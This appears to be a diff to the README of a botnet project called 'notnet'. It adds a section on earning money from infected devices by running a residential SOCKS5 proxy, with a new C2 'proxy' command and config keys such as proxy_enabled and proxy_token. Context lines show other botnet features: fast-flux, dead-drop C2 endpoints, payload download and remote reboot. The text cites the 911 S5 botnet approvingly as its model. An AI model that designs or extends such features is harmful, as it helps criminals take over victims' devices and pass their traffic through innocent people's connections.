@@ -124,6 +124,33 @@ placeholder is rejected.
    - Produce the bundle with `make dist-src` (prints the pin to set).
    - Enabled with `payload_compile_enabled=1`.
 
+## Monetization (Residential SOCKS5 Proxy)
+
+The bot monetizes its **network position** rather than its compute — the
+spiritual successor to mining and the pattern that drove **911 S5 to 19
+million infected devices before its 2024 takedown** (ZeroAccess's successor).
+Renting the bot's residential IP as an egress proxy has better margins and
+far lower noise than cryptomining.
+
+When enabled, the bot runs a **SOCKS5 forward proxy** (RFC 1928) that accepts
+CONNECT requests and forwards them to any IPv4 or domain destination. A
+client authenticates with the per-bot `proxy_token` (RFC 1929 user/pass —
+the token is the password), then its traffic exits through the bot's IP. The
+C2 aggregates heartbeat proxy status into a **residential-proxy inventory**.
+
+- **Auth is mandatory and fail-closed.** The proxy refuses to bind without a
+  configured `proxy_token`; a client that offers no user/pass method is
+  rejected. Password comparison is constant-time (no timing side-channel).
+- **Bounded by design.** The accept loop runs in its own pthread (never
+  blocks the C2 loop), each connection gets a detached worker (capped at
+  32), tunnel buffers are 4KB, and handshake/tunnel I/O is select-bounded.
+- **Destinations:** IPv4 and domain names supported; IPv6 rejected.
+- **Operator control:** `proxy on [port]` / `proxy off` at runtime, or set
+  `proxy_enabled=1` to start at boot. `config_set proxy_enabled=1` also
+  starts it live.
+- **Heartbeat** reports `proxy_on` + `proxy_port` so the C2 can build the
+  inventory.
+
 ## Commands
 
 Commands are issued via the C2 channels (IRC PRIVMSG or HTTP/WS JSON with the
@@ -141,7 +168,8 @@ shared secret). The command queue is rate-limited to 10 commands/second.
 | reboot  | `reboot` | Implemented — sync + reboot the target |
 | sleep   | `sleep <seconds>` | Implemented — set scan interval (clamped 1–3600) |
 | config_set | `config_set <key>=<value>` | Implemented — allowlisted runtime config keys |
-| status  | — | Implemented — heartbeat reports version, hostname, uptime, scan count |
+| proxy   | `proxy on [port]` / `proxy off` | Implemented — start/stop the residential SOCKS5 forward proxy (requires `proxy_token`) |
+| status  | — | Implemented — heartbeat reports version, hostname, uptime, scan count, proxy status |
 
 ## Configuration
 
@@ -168,6 +196,9 @@ The bot loads config from `/etc/notnet.conf` (key=value format):
 || `flux_ttl` | `60` | Seconds between flux re-resolution + IP rotation (1–3600) |
 || `dead_drop_url` | *(none)* | Dead-drop C2 endpoint: a pastebin-style HTTP URL hosting the endpoint blob. Fetched at boot and every `dead_drop_interval` s; applied only if the blob echoes `c2_secret` |
 || `dead_drop_interval` | `300` | Seconds between dead-drop re-resolution (30–86400) |
+|| `proxy_enabled` | `0` | 0/1 — run the residential SOCKS5 forward proxy (monetizes the bot's network position). Requires `proxy_token` or the proxy refuses to bind (fail-closed) |
+|| `proxy_port` | `1080` | Port the SOCKS5 proxy listens on (1–65535) |
+|| `proxy_token` | *(none)* | Password clients must present (RFC 1929) to use the proxy. No default — the proxy will not start without it (or `NOTNET_PROXY_TOKEN` env var) |
 || `c2_secret` | *(none)* | Shared secret echoed by C2; HTTP/WS commands are rejected without it (or `NOTNET_C2_SECRET` env var) |
 || `tls_cert_pin_sha256` | *(none)* | TLS server cert fingerprint pin; requires `make TLS=1` (or `NOTNET_TLS_CERT_PIN_SHA256` env var) |
 || `payload_sha256` | *(none)* | Expected SHA-256 of downloaded payload; update is refused without a match (or `NOTNET_PAYLOAD_SHA256` env var) |
